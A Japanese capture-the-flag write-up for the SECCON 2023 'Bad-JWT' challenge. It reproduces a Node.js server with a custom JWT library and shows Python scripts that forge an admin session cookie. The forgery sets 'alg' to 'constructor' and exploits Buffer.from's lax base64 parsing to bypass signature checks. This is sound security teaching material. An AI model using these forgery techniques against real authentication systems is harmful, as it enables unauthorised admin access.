# SECCON CTF 2023 Quals - Bad-JWT

## Challenge

I think this JWT implementation is not bad.

[http://bad-jwt.seccon.games:3000](http://bad-jwt.seccon.games:3000)

### Files

<details>

<summary>配布されたソースコード</summary>

可読性向上のため、一部書き換えています。また、問題を解くにあたって不要な部分は省略しています。

`challenge/src/index.js`

```js
const FLAG = "SECCON{dummy}";
const PORT = "3000";

const express = require("express");
const cookieParser = require("cookie-parser");
const jwt = require("./jwt");

const app = express();
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

const secret = require("crypto").randomBytes(32).toString("hex");

app.use((req, res, next) => {
  try {
    const token = req.cookies.session;
    const payload = jwt.verify(token, secret);
    req.session = payload;
  } catch (e) {
    return res.status(400).send("Authentication failed" + e);
  }
  return next();
});

app.get("/", (req, res) => {
  if (req.session.isAdmin === true) {
    return res.send(FLAG);
  } else {
    return res.status().send("You are not admin!");
  }
});

app.listen(PORT, () => {
  const admin_session = jwt.sign("HS512", { isAdmin: true }, secret);
  console.log(`[INFO] Use ${admin_session} as session cookie`);
  console.log(`Challenge server listening on port ${PORT}`);
});
```

`challenge/src/jwt.js`

```js
const crypto = require("crypto");

const base64UrlEncode = (str) => {
  return Buffer.from(str)
    .toString("base64")
    .replace(/=*$/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
};

const base64UrlDecode = (str) => {
  return Buffer.from(str, "base64").toString();
};

const algorithms = {
  hs256: (data, secret) =>
    base64UrlEncode(crypto.createHmac("sha256", secret).update(data).digest()),
  hs512: (data, secret) =>
    base64UrlEncode(crypto.createHmac("sha512", secret).update(data).digest()),
};

const stringifyPart = (obj) => {
  return base64UrlEncode(JSON.stringify(obj));
};

const parsePart = (str) => {
  return JSON.parse(base64UrlDecode(str));
};

const createSignature = (header, payload, secret) => {
  const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
  const signature = algorithms[header.alg.toLowerCase()](data, secret);
  return signature;
};

const parseToken = (token) => {
  const parts = token.split(".");
  if (parts.length !== 3) throw Error("Invalid JWT format");

  const [header, payload, signature] = parts;
  const parsedHeader = parsePart(header);
  const parsedPayload = parsePart(payload);

  return { header: parsedHeader, payload: parsedPayload, signature };
};

const sign = (alg, payload, secret) => {
  const header = {
    typ: "JWT",
    alg: alg,
  };

  const signature = createSignature(header, payload, secret);

  const token = `${stringifyPart(header)}.${stringifyPart(
    payload
  )}.${signature}`;
  return token;
};

const verify = (token, secret) => {
  const { header, payload, signature: expected_signature } = parseToken(token);

  const calculated_signature = createSignature(header, payload, secret);

  const calculated_buf = Buffer.from(calculated_signature, "base64");
  const expected_buf = Buffer.from(expected_signature, "base64");

  if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
    throw Error("Invalid signature");
  }

  return payload;
};

module.exports = { sign, verify };
```

</details>

## Solution

### 1. 正常なアクセスを送信する

ソースコードを見ると、cookieの`session`にJWTトークンを設定すると、署名を検証することがわかります。

```js
const token = req.cookies.session;
```

JWTのシグネチャを計算するのは面倒なので、問題のソースコードを少し書き換えます。

```diff
const verify = (token, secret) => {
  const { header, payload, signature: expected_signature } = parseToken(token);

  const calculated_signature = createSignature(header, payload, secret);
+ console.log({calculated_signature, expected_signature})

  const calculated_buf = Buffer.from(calculated_signature, "base64");
  const expected_buf = Buffer.from(expected_signature, "base64");

  if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
    throw Error("Invalid signature");
  }

  return payload;
};
```

これで適当なJWTトークンを送信すると、シグネチャの計算結果が表示されます。2回送信すれば正しいシグネチャがわかるので署名が受理されるはずです。

```py
import base64
import requests
import json


header = {"typ": "JWT", "alg": "HS256"}
headerStr = json.dumps(header).encode("utf-8")
body = {"isAdmin": True}
bodyStr = json.dumps(body).encode("utf-8")

def base64_encode(str:str):
    return base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")

headerBase64 = str(base64_encode(headerStr))[2:-1]
bodyBase64 = str(base64_encode(bodyStr))[2:-1]

jwt = f"{headerBase64}.{bodyBase64}.ここにシグネチャを入れる"


res = requests.get("http://localhost:3000/", cookies={"session": jwt})

print(res.text)
```

### 2. 不正なシグネチャを作成する

攻撃者が入力できる内容はJWTトークンのみです。つまり、JWTのheader(`alg`, `typ`)、body、signature(壊れているもの)のみです。
ここで、bodyは`{"isAdmin": True}`にするしかなさそうで、かつheaderの`typ`は使用されていなさそうなので、考えられることは以下の2つです。

- headerの`alg`を変更する
- 壊れた`signature`でも署名を通す

結論から言うと、両方とも必要なので、前者から説明します。

`alg`を使用されている箇所を見ると、`createSignature`関数があります。これをよく見ると、なかなか怪しそうです。`algorithms`変数にはオブジェクトが入っていますが、ユーザの入力の文字列をそのまま受け取っています。JavaScriptのオブジェクトに対する`[]`アクセサには、例えば`__proto__`など、いくつかの特殊なキーがあります。今回は式の後半に`(data, secret)`が入っており、アクセスした結果、引数が2つ(またはoptionalな引数がそれ以上)の関数が返ってくる必要があります。

```js
const createSignature = (header, payload, secret) => {
  const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
  const signature = algorithms[header.alg.toLowerCase()](data, secret);
  return signature;
};
```

そこで、`constructor`を使用します。`constructor`は関数で、引数は可変です。また、`Object[constructor](data, secret)`はdataを文字列として受け取り、`[String: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ']`だけが返ります。つまり、secretに依存しません。

先ほどのコードを少し書き換えて、送信してみます。

```py
import base64
import requests
import json


header = {"typ": "JWT", "alg": "constructor"}
headerStr = json.dumps(header).encode("utf-8")
body = {"isAdmin": True}
bodyStr = json.dumps(body).encode("utf-8")


def base64_encode(str: str):
    return (
        base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")
    )


headerBase64 = str(base64_encode(headerStr))[2:-1]
bodyBase64 = str(base64_encode(bodyStr))[2:-1]

jwt = f"{headerBase64}.{bodyBase64}.foo"

res = requests.get("http://localhost:3000/", cookies={"session": jwt})

print(res.text)
```

すると、以下の内容が返ってきます。

```json
{
  expected_signature: 'foo',
  calculated_signature: [String: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ']
}
```

ここで、jwtのシグネチャを書かれているものと同じにします。

```js
jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ"
```

すると当然ですが、`.`が4つではInvalid JWT formatです。また、`expected_signature`はstring、`calculated_signature`はオブジェクトになります。当然これでは一致しません。


### 3. Bypass `Buffer.compare`

`Buffer.from`の[ドキュメント](https://nodejs.org/api/buffer.html#static-method-bufferfromobject-offsetorencoding-length)を読んでみましょう。

以下のテキストが書かれています。

> For objects that support Symbol.toPrimitive, returns Buffer.from(object[Symbol.toPrimitive]('string'), offsetOrEncoding).

試してみましょう！

```js
class Foo {
  [Symbol.toPrimitive]() {
    return "ABC";
  }
}

const buf1 = Buffer.from(new Foo());

console.log({ buf1 }); // { buf1: <Buffer 41 42 43> }
```

確かにテキストの部分のみが取り出されています。ここで、`Buffer.from`の第二引数に`base64`を指定しつつ、Base64として使用されない文字列を挿入してみます。

```js
class Foo {
  [Symbol.toPrimitive]() {
    return "eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9";
  }
}
class Bar {
  [Symbol.toPrimitive]() {
    // add $^.
    return "eyJ0eXAi$O$iJK^V1&Qi.LCJh.&bGc.i^Oi.Jjb.25z^dHJ1Y3RvciJ9"; // ^^
  }
}

const buf1 = Buffer.from(new Foo(), "base64");
const buf2 = Buffer.from(new Bar(), "base64");

console.log({ buf1, buf2 });
//{
//  buf1: <Buffer 7b 22 74 79 70 22 3a 22 4a 57 54 22 2c 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d>,
//  buf2: <Buffer 7b 22 74 79 70 22 3a 22 4a 57 54 22 2c 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d>
//}
```

Base64として使用されない文字は無視されることがわかりました。これを利用します。

jwt tokenを以下のように書き換えます。

```py
jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ"
```

すると、`signature`は確かに違いますが、`Buffer.from`でピリオドが削除され、`Buffer.compare`の結果が0になります。

```txt
{
  expected_signature: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ',
  calculated_signature: [String: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ'],
  calculated_buf: <Buffer 7b 22 74 79 70 22 3a 22 4a 57 54 22 2c 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d 7b 22 69 73 41 64 6d 69 6e 22 3a 74 72 75 65 7d>,
  expected_buf: <Buffer 7b 22 74 79 70 22 3a 22 4a 57 54 22 2c 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d 7b 22 69 73 41 64 6d 69 6e 22 3a 74 72 75 65 7d>
}
```

### 4. Get flag

```txt
SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}
```
